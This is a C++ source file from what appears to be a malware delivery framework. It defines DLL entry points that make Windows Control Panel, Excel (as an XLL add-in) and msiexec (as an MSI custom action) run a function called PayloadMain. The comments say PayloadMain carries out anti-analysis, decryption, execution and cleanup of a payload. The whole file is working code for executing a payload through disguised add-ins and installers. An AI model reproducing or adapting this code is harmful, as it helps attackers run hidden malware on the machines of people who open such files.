// Sideload Delivery Format entry points
// CPL (control.exe), XLL (excel.exe), MSI (msiexec.exe)
//
// The DLL exports below call PayloadMain() which contains the full
// payload execution chain (anti-analysis, decrypt, execute, cleanup).
// PayloadMain is defined in Entry.cpp and shared between WinMain and DLL.

#include <windows.h>
#include "Sideload.h"

// Saved module handle for DLL builds
static HMODULE g_hInstance = nullptr;

// ── DllMain: minimal initialization ──
// DllMain runs under loader lock — no complex operations here.
// The actual work happens in the export function (CPlApplet/xlAutoOpen/etc).
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        g_hInstance = hModule;
        DisableThreadLibraryCalls(hModule);
    }
    return TRUE;
}

// ── CPL: Control Panel Applet ──
// control.exe loads CPL DLLs and calls CPlApplet.
// CPL_INIT is the first message — we execute payload here.
// All other messages return FALSE/0 (no additional panels).
LONG CALLBACK CPlApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)
{
    switch (msg)
    {
    case 1: // CPL_INIT
        PayloadMain(g_hInstance);
        return TRUE;

    case 2: // CPL_GETCOUNT
        return 0;

    case 3: // CPL_INQUIRE
    case 4: // CPL_NEWINQUIRE
    case 5: // CPL_STARTWPARAMS
    case 6: // CPL_SETUP
    default:
        return 0;
    }
}

// ── XLL: Excel Add-in ──
// excel.exe calls xlAutoOpen when loading an XLL add-in.
// Return 1 to indicate success (Excel convention).
int __stdcall xlAutoOpen(void)
{
    PayloadMain(g_hInstance);
    return 1;
}

// ── MSI: Custom Action DLL ──
// msiexec.exe calls the custom action entry during installation.
// Return ERROR_SUCCESS (0) to indicate the action completed.
// MSIHANDLE is forward-declared; we use the raw integer type.
UINT __stdcall CustomActionEntry(unsigned int hInstall)
{
    (void)hInstall;
    PayloadMain(g_hInstance);
    return 0; // ERROR_SUCCESS
}
